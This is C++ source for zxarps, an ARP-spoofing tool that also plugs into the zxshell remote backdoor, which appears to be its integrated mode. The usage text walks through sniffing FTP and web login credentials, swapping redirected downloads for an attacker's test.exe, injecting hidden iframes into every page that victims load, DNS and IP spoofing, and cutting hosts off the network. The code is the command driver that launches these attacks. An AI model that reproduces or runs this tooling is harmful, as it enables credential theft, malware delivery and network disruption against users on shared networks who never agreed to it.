// Author: LZX
// E-mail: LZX@qq.com
// QQ: 5088090
// Test PlatForm: WinXP SP2
// Compiled On: VC++ 6.0
// Platform SDK Version: Windows Server 2003 SP1 + WpdPack 3.1

// year-month-day
// Version: 2007.06.28
// Last Modified: 2007.06.28

// 感谢 cooldiyer 的开源(pZXARPS->3.1)

//2007-06-09 集成到zxshell
//2007.06.28 定时重新扫描指定的网段中的存活主机

#include "ARPSpoof.h"
#include "GetOpt.h"

/*

wpcap.dll
	pcap_perror			
	pcap_sendpacket		
	pcap_next_ex		
	pcap_freealldevs	
	pcap_close			
	pcap_breakloop		
	pcap_open_live		
	pcap_findalldevs	
	
*/



CARPSpoof *pZXARPS;


char *ZXARPS_USAGE = 		
		"options:\r\n"
		"    -idx [index]       网卡索引号\r\n"
		"    -ip [ip]           欺骗的IP,用'-'指定范围,','隔开\r\n"
		"    -sethost [ip]      默认是网关,可以指定别的IP\r\n"
		"    -port [port]       关注的端口,用'-'指定范围,','隔开,没指定默认关注所有端口\r\n"
		"    -rescanInterval [val] 重新扫描活动主机的时间间隔，单位毫秒，默认30000\r\n"
		"    -online            仅仅扫描出指定的IP中的活动主机\r\n"
		"----\r\n"
		"    -reset             恢复目标机的ARP表\r\n"
		"    -rsinterval [val]  恢复ARP表的时间间隔，默认只恢复一次,单位毫秒\r\n"
		"----\r\n"
		"    -netcut            切断目标主机网络\r\n"
		"    -cutmac [string]   指定的IP段中(比如指定整个网段)针对性要切断的mac,多个用','隔开\r\n"
		"    -cutinterval [val] 欺骗的时间间隔，默认只欺骗一次,单位毫秒\r\n"
		"    -cutmode [val]     0|1, 0表示源MAC随机，1表示MAC为网关MAC\r\n"
		"----\r\n"
		"    -hostname [ip]     探测主机时获取主机名信息\r\n"
		"    -logfilter [string]设置保存数据的条件，必须+-_做前缀,后跟关键字,\r\n"
		"                       ','隔开关键字,多个条件'|'隔开\r\n"
		"                       所有带+前缀的关键字都出现的包则写入文件\r\n"
		"                       带-前缀的关键字出现的包不写入文件\r\n"
		"                       带_前缀的关键字一个符合则写入文件(如有+-条件也要符合)\r\n"
		"    -save_a [filename] 将捕捉到的数据写入文件 ACSII模式\r\n"
		"    -save_h [filename] HEX模式\r\n"
		"\r\n"
		"    -hacksite [ip]     指定要插入代码的站点域名或IP,\r\n"
		"                       多个可用','隔开,没指定则影响所有站点\r\n"
		"    -insert [html code]指定要插入html代码\r\n"
		"\r\n"
		"    -postfix [string]  关注的后缀名，只关注HTTP/1.1 302\r\n"
		"    -hackURL [url]     发现关注的后缀名后修改URL到新的URL\r\n"
		"    -filename [name]   新URL上有效的资源文件名\r\n"
		"\r\n"
		"    -hackdns [string]  DNS欺骗，只修改UDP的报文,多个可用','隔开\r\n"
		"                       格式: 域名|IP，www.aa.com|222.22.2.2,www.bb.com|1.1.1.1\r\n"
		"\r\n"
		"    -spoofip [string]  IP欺骗，当你登录受欺骗的主机时，它会当你是那个假IP\r\n"
		"                       格式: 你的IP|假IP\r\n"
		"\r\n"
		"    -Interval [val]    定时欺骗的时间间隔，单位:毫秒:默认是30000 ms\r\n"
		"    -spoofmode [1|2|3] 欺骗对象:1为网关,2为目标机,3为两者(默认)\r\n"
		"    -speed [kb]        限制指定的IP或IP段的网络总带宽,单位:KB\r\n"
		"\r\n"
		"example:\r\n"
		"    嗅探指定的IP段中端口80的数据，并以HEX模式写入文件\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -save_h sniff.log\r\n\r\n"
		"    FTP嗅探,在21或2121端口中出现USER或PASS的数据包记录到文件\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2 -port 21,2121 -spoofmode 2 -logfilter \"_USER ,_PASS\" -save_a sniff.log\r\n\r\n"
		"    HTTP web邮箱登陆或一些论坛登陆的嗅探,根据情况自行改关键字\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.50 -port 80 -logfilter \"+POST ,+user,+pass\" -save_a sniff.log\r\n\r\n"
		"    用|添加嗅探条件,这样FTP和HTTP的一些敏感关键字可以一起嗅探\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2 -port 80,21 -logfilter \"+POST ,+user,+pass|_USER ,_PASS\" -save_a sniff.log\r\n\r\n"
		"    如果嗅探到目标下载文件后缀是exe等则更改Location:为http://xx.net/test.exe\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.12,192.168.0.20-192.168.0.30 -spoofmode 3 -postfix \".exe,.rar,.zip\" -hackurl http://xx.net/ -filename test.exe\r\n\r\n"
		"    指定的IP段中的用户访问到-hacksite中的网址则只显示just for fun\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -hacksite 222.2.2.2,www.a.com,www.b.com -insert \"just for fun<noframes>\"\r\n\r\n"
		"    指定的IP段中的用户访问的所有网站都插入一个框架代码, 且每分钟重新扫描IP段中的存活主机\r\n"
		"    zxarps -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -rescanInterval 60000 -insert \"<iframe src='xx' width=0 height=0>\"\r\n\r\n"
		"    指定的两个IP的总带宽限制到20KB\r\n"
		"    zxarps -idx 0 -ip 192.168.0.55,192.168.0.66 -speed 20\r\n\r\n"
		"    DNS欺骗\r\n"
		"    zxarps -idx 0 -ip 192.168.0.55,192.168.0.66 -hackdns \"www.aa.com|222.22.2.2,www.bb.com|1.1.1.1\"\r\n\r\n"
		"    欺骗源IP, a(外网IP)连接到c(一般是受欺骗的公网IP)后，c记录到的IP是b\r\n"
		"    zxarps -idx 0 -ip c.c.c.c -spoofip \"a.a.a.a|b.b.b.b\"\r\n\r\n"
		"    仅仅查询在线主机\r\n"
		"    zxarps -idx 0 -ip 192.168.0.1-192.168.0.254 -online\r\n\r\n"
		"    切断别人的网络, 可根据spoofmode参数从网关或双边同时切断\r\n"
		"    zxarps -idx 0 -ip 192.168.0.9 -netcut -cutinterval 10000\r\n\r\n"

		"\r\n"
		//"zxarps Build 06/22/2007\r\n"
		;

#if defined _ZXSHELL


int ZXARPS(MainPara *args)
{

	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();


	if(PCAPAPI::Inited == false)
	{
		if(!PCAPAPI::Init_pcapAPI())
		{
			SendMessage(Socket, "zxarps cann't setup. please install winpcap.\r\n");
			return 0;
		}

		pZXARPS = new CARPSpoof;

	}
	if(!pZXARPS)
	{
		SendMessage(Socket, "zxarps setup failed.\r\n");
		return 0;
	}

	pZXARPS->Socket = Socket;

	char *Usage = 
		"ZXARPS.\r\n"
		"Usage:\r\n"
		"    ZXARPS [-view] [-stop] [-help]\r\n"
		;

	int ret;
	int index = ~0;
	bool x=false, reset = false, cutter = false;
	char *strIP = NULL, *strPort = NULL, *szHostIP = NULL;
	int nAdapter = pZXARPS->GetAdapterList();

	if(nAdapter == 0)
	{
		SendMessage(Socket, "Not Found Any Adapters\r\n");
		return 0;
	}

	if(!pZXARPS->GetStatus())
		pZXARPS->init();
/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			if(!stricmp(&argv[i][1], "help"))
			{
				SendMessage(Socket, ZXARPS_USAGE);
				return 0;
			}
			if(!stricmp(&argv[i][1], "reset"))
			{
				reset = true;
			}
			if(!stricmp(&argv[i][1], "hostname"))
			{
				pZXARPS->EnableGetNetbiosName();
			}
			if(!stricmp(&argv[i][1], "stop"))
			{
				if(!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
				}
				SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
				pZXARPS->KillSpoofThread();
				SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
				pZXARPS->RestoreARPTable();
				pZXARPS->StopCapture();
				pZXARPS->destroy();
				return SendMessage(Socket, "Quit.\r\n");
			}
			if(!stricmp(&argv[i][1], "view"))
			{
				if(!pZXARPS->GetStatus())
				{
					return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
				}

				SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
					pZXARPS->cmdline);

				pZXARPS->GetAliveHostList();

				if(pZXARPS->packetcount > 0)
				{
				SendMessage(Socket, "%d packets captured writed to %s.\r\n",
					pZXARPS->packetcount,
					pZXARPS->m_SaveToFile);
				}
				return 0;
			}		
		}else
		{
			if(!stricmp(&argv[i-1][1], "idx"))
			{
				index = atoi(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "ip"))
			{
				strIP = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "sethost"))
			{
				szHostIP = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "port"))
			{
				strPort = argv[i];
			}else
			if(!stricmp(&argv[i-1][1], "hacksite"))
			{
				if(pZXARPS->SetHackSite(argv[i]) == 0)
				{
					SendMessage(Socket, "Not found any available site to hack\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "insert"))
			{
				pZXARPS->EnableHackHtml(true);
				pZXARPS->InsertHtmlCode(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "hackURL"))
			{
				pZXARPS->EnableHackURL(true);
				pZXARPS->SetSpoolURL(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "filename"))
			{
				pZXARPS->SetPostfixURLFileName(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "postfix"))
			{
				pZXARPS->AddRule_PostFix(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "spoofmode"))
			{
				pZXARPS->SetSpoofMode(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "Interval"))
			{
				pZXARPS->SetInterval(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "save_h"))
			{
				pZXARPS->EnableSaveData(true);
				if(! pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "save_a"))
			{
				pZXARPS->EnableSaveData(false);
				if(! pZXARPS->SetLogFileName(argv[i]))
				{
					SendMessage(Socket, "bad filename\r\n");
					return 0;
				}
			}else
			if(!stricmp(&argv[i-1][1], "logfilter"))
			{
				pZXARPS->SetFilter(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "speed"))
			{
				pZXARPS->SetBandWidth(atoi(argv[i]));
			}else
			if(!stricmp(&argv[i-1][1], "hackdns"))
			{
				pZXARPS->EnableHackDNS(true);
				pZXARPS->SetHackDomainName(argv[i]);
			}else
			if(!stricmp(&argv[i-1][1], "spoofip"))
			{
				pZXARPS->EnableSpoofIP(true);
				pZXARPS->SetSpoofIP(argv[i]);
			}

		}
	}
*/
///////////////////////处理命令行参数
	CGetOpt cmdopt(argc, argv, false);
	
	if(argc < 2)
	{
		SendMessage(Socket, Usage);
		return 0;
	}

	if(cmdopt.checkopt("help"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	if(cmdopt.checkopt("reset"))
	{
		reset = true;
	}
	if(cmdopt.getstr("rsinterval"))
	{
		pZXARPS->SetRestoreInterval(atoi(cmdopt));
	}
	if(cmdopt.checkopt("netcut"))
	{
		cutter = true;
	}
	if(cmdopt.getstr("cutinterval"))
	{
		pZXARPS->SetCutInterval(atoi(cmdopt));
	}
	if(cmdopt.getstr("cutmac"))
	{
		pZXARPS->AddRuleToCut(cmdopt);
	}

	if(cmdopt.getstr("cutmode"))
	{
		pZXARPS->SetCutMode(atoi(cmdopt));
	}

	if(cmdopt.checkopt("hostname"))
	{
		pZXARPS->EnableGetNetbiosName();
	}
	if(cmdopt.checkopt("stop"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
		}
		SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
		pZXARPS->KillSpoofThread();
		SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		pZXARPS->StopCapture();
		pZXARPS->destroy();
		return SendMessage(Socket, "Quit.\r\n");
	}
	if(cmdopt.checkopt("view"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
		}

		SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
			pZXARPS->cmdline);

		pZXARPS->GetAliveHostList();

		if(pZXARPS->packetcount > 0)
		{
		SendMessage(Socket, "%d packets captured writed to %s.\r\n",
			pZXARPS->packetcount,
			pZXARPS->m_SaveToFile);
		}
		return 0;
	}
	////

	if(!cmdopt.getstr("idx"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	index = cmdopt.getint("idx");

	if(!cmdopt.getstr("ip"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}

	strIP = cmdopt;

	if(cmdopt.getstr("rescanInterval"))
	{
		pZXARPS->SetRescanInterval(atoi(cmdopt));
	}

	szHostIP = cmdopt.getstr("sethost");

	strPort = cmdopt.getstr("port");

	if(cmdopt.getstr("hacksite"))
	{
		if(pZXARPS->SetHackSite(cmdopt) == 0)
		{
			SendMessage(Socket, "Not found any available site to hack\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("insert"))
	{
		pZXARPS->EnableHackHtml(true);
		pZXARPS->InsertHtmlCode(cmdopt);
	}
	if(cmdopt.getstr("hackURL"))
	{
		pZXARPS->EnableHackURL(true);
		pZXARPS->SetSpoolURL(cmdopt);
	}
	if(cmdopt.getstr("filename"))
	{
		pZXARPS->SetPostfixURLFileName(cmdopt);
	}
	if(cmdopt.getstr("postfix"))
	{
		pZXARPS->AddRule_PostFix(cmdopt);
	}
	if(cmdopt.getstr("spoofmode"))
	{
		pZXARPS->SetSpoofMode(cmdopt.getint("spoofmode"));
	}
	if(cmdopt.getstr("Interval"))
	{
		pZXARPS->SetInterval(cmdopt.getint("Interval"));
	}
	if(cmdopt.getstr("save_h"))
	{
		pZXARPS->EnableSaveData(true);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("save_a"))
	{
		pZXARPS->EnableSaveData(false);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("logfilter"))
	{
		pZXARPS->SetFilter(cmdopt);
	}
	if(cmdopt.getstr("speed"))
	{
		pZXARPS->SetBandWidth(cmdopt.getint("speed"));
	}
	if(cmdopt.getstr("hackdns"))
	{
		pZXARPS->EnableHackDNS(true);
		pZXARPS->SetHackDomainName(cmdopt);
	}
	if(cmdopt.getstr("spoofip"))
	{
		pZXARPS->EnableSpoofIP(true);
		pZXARPS->SetSpoofIP(cmdopt);
	}


///////////////////////

	if(pZXARPS->GetStatus())
	{
		return SendMessage(Socket, "ZXARPS Is Already Running.\r\n");
	}

	ret = pZXARPS->OpenAdapterByIndex(index);
	if(ret == false)
	{
		SendMessage(Socket, "Open Adapter Failed!\r\n");
		return 0;
	}

	if(!pZXARPS->SetSpoofHost(szHostIP))
	{
		return 0;
	}

	ret = pZXARPS->MakeIPAndPortList(strIP, strPort);
	if(ret <= 0)
	{
		SendMessage(Socket, "IP List Is Empty.\r\n");
		return 0;
	}

	SendMessage(Socket, "Scanning Alive Host......\r\n");

	ret = pZXARPS->GetHostInfo();
	if(ret <= 0)
	{
		SendMessage(Socket, "Not Found Alive Host.\r\n");
		return 0;
	}
	pZXARPS->GetAliveHostList();

	if(cmdopt.checkopt("online"))
		return 0;
	
	if(cutter)
	{
		printf("cutting......\r\n");
		pZXARPS->LANCutter();
		printf("Bye!\r\n");
		return 0;

	}
	if(reset)
	{
		SendMessage(Socket, "Restoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		SendMessage(Socket, "Quit!\r\n");
		return 0;
	}

	if(ret>0)
	{
		SendMessage(Socket, "Sniffing in background......\r\n");
		pZXARPS->StartCapture();
	}

	pZXARPS->SaveCmdline(args->lpCmd);

	return 0;
}

//以上为集成进zxshell的代码===========================
#else
//以下为独立编译的代码================================

//#include "..\..\zxsCommon\zxsWinAPI.h"

int SendMessage(SOCKET Socket, const char *fmt, ...)
{

	va_list args;
	int n;
	char TempBuf[8192];
	va_start(args, fmt);
	n = vsprintf(TempBuf, fmt, args);
	va_end(args);


	printf("%s", TempBuf);
	return 0;
}

int ctrlc = 0;
BOOL WINAPI HandlerRoutine(DWORD fdwCtrlType)
{ 
	switch (fdwCtrlType) 
	{ 
		// Handle the CTRL-C signal. 
    case CTRL_C_EVENT: 
    case CTRL_CLOSE_EVENT: 
    case CTRL_BREAK_EVENT:  
    case CTRL_LOGOFF_EVENT: 
    case CTRL_SHUTDOWN_EVENT:

		ctrlc++;

		if(ctrlc == 2)
			return FALSE;
		if(ctrlc == 3)
			exit(88);
		printf("\r\nCtrl+C Is Pressed.\r\n");
		Sleep(200);
		printf("\r\nKilling the SpoofThread......\r\n");
		pZXARPS->KillSpoofThread();
		printf("\r\nRestoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		printf("Exiting......\r\n");
		pZXARPS->StopCapture();
		printf("\r\nBye!\r\n");
		return TRUE;		
    default: 
		return FALSE; 
	}
}

void Usage()
{
	printf(ZXARPS_USAGE);
}

int main(int argc, char *argv[])
{
	if(PCAPAPI::Inited == false)
	{
		if(!PCAPAPI::Init_pcapAPI())
		{
			printf("zxarps cann't setup. please install winpcap.\r\n");
			return 0;
		}
		pZXARPS = new CARPSpoof;

	}
	if(!pZXARPS)
	{
		printf("zxarps setup failed.\r\n");
		return 0;
	}

	int ret;
	int index = ~0;
	bool x=false, reset = false, cutter = false;
	char *strIP = NULL, *strPort = NULL, *szHostIP = NULL;
	int nAdapter = pZXARPS->GetAdapterList();

	if(nAdapter == 0)
	{
		printf("Not Found Any Adapters\r\n");
		return 0;
	}

	SOCKET Socket = 0;

	CGetOpt cmdopt(argc, argv, false);
	
	if(cmdopt.checkopt("help"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	if(cmdopt.checkopt("reset"))
	{
		reset = true;
	}
	if(cmdopt.checkopt("print"))
	{
		pZXARPS->printfFlag = 1;
	}
	if(cmdopt.getstr("rsinterval"))
	{
		pZXARPS->SetRestoreInterval(atoi(cmdopt));
	}
	if(cmdopt.checkopt("netcut"))
	{
		cutter = true;
	}
	if(cmdopt.getstr("cutinterval"))
	{
		pZXARPS->SetCutInterval(atoi(cmdopt));
	}
	if(cmdopt.getstr("cutmac"))
	{
		pZXARPS->AddRuleToCut(cmdopt);
	}
	if(cmdopt.getstr("cutmode"))
	{
		pZXARPS->SetCutMode(atoi(cmdopt));
	}

	if(cmdopt.checkopt("hostname"))
	{
		pZXARPS->EnableGetNetbiosName();
	}
	if(cmdopt.checkopt("stop"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Are Not Running.\r\n");
		}
		SendMessage(Socket, "\r\nKilling the SpoofThread......\r\n");
		pZXARPS->KillSpoofThread();
		SendMessage(Socket, "\r\nRestoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		pZXARPS->StopCapture();
		pZXARPS->destroy();
		return SendMessage(Socket, "Quit.\r\n");
	}
	if(cmdopt.checkopt("view"))
	{
		if(!pZXARPS->GetStatus())
		{
			return SendMessage(Socket, "ZXARPS Is Not Running.\r\n");
		}

		SendMessage(Socket, "Setup Cmdline:\r\n%s\r\n",
			pZXARPS->cmdline);

		pZXARPS->GetAliveHostList();

		if(pZXARPS->packetcount > 0)
		{
		SendMessage(Socket, "%d packets captured writed to %s.\r\n",
			pZXARPS->packetcount,
			pZXARPS->m_SaveToFile);
		}
		return 0;
	}
	////

	if(!cmdopt.getstr("idx"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	index = cmdopt.getint("idx");

	if(!cmdopt.getstr("ip"))
	{
		SendMessage(Socket, ZXARPS_USAGE);
		return 0;
	}
	strIP = cmdopt;

	if(cmdopt.getstr("rescanInterval"))
	{
		pZXARPS->SetRescanInterval(atoi(cmdopt));
	}

	szHostIP = cmdopt.getstr("sethost");

	strPort = cmdopt.getstr("port");

	if(cmdopt.getstr("hacksite"))
	{
		if(pZXARPS->SetHackSite(cmdopt) == 0)
		{
			SendMessage(Socket, "Not found any available site to hack\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("insert"))
	{
		pZXARPS->EnableHackHtml(true);
		pZXARPS->InsertHtmlCode(cmdopt);
	}
	if(cmdopt.getstr("hackURL"))
	{
		pZXARPS->EnableHackURL(true);
		pZXARPS->SetSpoolURL(cmdopt);
	}
	if(cmdopt.getstr("filename"))
	{
		pZXARPS->SetPostfixURLFileName(cmdopt);
	}
	if(cmdopt.getstr("postfix"))
	{
		pZXARPS->AddRule_PostFix(cmdopt);
	}
	if(cmdopt.getstr("spoofmode"))
	{
		pZXARPS->SetSpoofMode(cmdopt.getint("spoofmode"));
	}
	if(cmdopt.getstr("Interval"))
	{
		pZXARPS->SetInterval(cmdopt.getint("Interval"));
	}
	if(cmdopt.getstr("save_h"))
	{
		pZXARPS->EnableSaveData(true);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("save_a"))
	{
		pZXARPS->EnableSaveData(false);
		if(! pZXARPS->SetLogFileName(cmdopt))
		{
			SendMessage(Socket, "bad filename\r\n");
			return 0;
		}
	}
	if(cmdopt.getstr("logfilter"))
	{
		pZXARPS->SetFilter(cmdopt);
	}
	if(cmdopt.getstr("speed"))
	{
		pZXARPS->SetBandWidth(cmdopt.getint("speed"));
	}
	if(cmdopt.getstr("hackdns"))
	{
		pZXARPS->EnableHackDNS(true);
		pZXARPS->SetHackDomainName(cmdopt);
	}
	if(cmdopt.getstr("spoofip"))
	{
		pZXARPS->EnableSpoofIP(true);
		pZXARPS->SetSpoofIP(cmdopt);
	}


///////////////////////

	if(pZXARPS->GetStatus())
	{
		return SendMessage(Socket, "ZXARPS Is Already Running.\r\n");
	}

	ret = pZXARPS->OpenAdapterByIndex(index);
	if(ret == false)
	{
		SendMessage(Socket, "Open Adapter Failed!\r\n");
		return 0;
	}

	if(!pZXARPS->SetSpoofHost(szHostIP))
	{
		return 0;
	}

	ret = pZXARPS->MakeIPAndPortList(strIP, strPort);
	if(ret <= 0)
	{
		SendMessage(Socket, "IP List Is Empty.\r\n");
		return 0;
	}

	SendMessage(Socket, "Scanning Current Alive Hosts......\r\n");

	ret = pZXARPS->GetHostInfo();
	if(ret <= 0)
	{
		SendMessage(Socket, "Not Found Any Alive Hosts.\r\n");
		return 0;
	}
	pZXARPS->GetAliveHostList();

	if(cmdopt.checkopt("online"))
		return 0;

	pZXARPS->StartupRescanThread();

	if(cutter)
	{
		printf("cutting......\r\n");
		pZXARPS->LANCutter();
		printf("Bye!\r\n");
		return 0;

	}

	if(reset)
	{
		printf("Restoring the ARPTable......\r\n");
		pZXARPS->RestoreARPTable();
		printf("Bye!\r\n");
		return 0;
	}

	SetConsoleCtrlHandler(HandlerRoutine, TRUE);

	if(ret>0)
	{
		printf("Sniffing......\r\n");
		pZXARPS->StartCapture();
		pZXARPS->wait();
	}
	return 0;
}

#endif